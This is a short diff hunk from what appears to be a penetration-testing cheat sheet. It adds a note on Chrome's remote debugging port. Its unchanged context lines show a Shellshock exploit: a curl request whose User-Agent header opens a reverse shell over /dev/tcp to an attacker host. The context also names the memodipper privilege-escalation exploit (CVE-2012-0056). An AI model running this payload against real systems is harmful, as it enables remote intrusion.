@@ -51,6 +51,14 @@ curl -H "User-Agent: () { :; }; /bin/bash -c 'echo aaaa; bash -i >& /dev/tcp/<at
 restricted: cannot specify `/' in command names
 ```
 
+#### Chrome
+
+--remote-debugging-port
+
+```
+chrome://inspect/
+```
+
 [CVE-2012-0056] memodipper
 
 ```
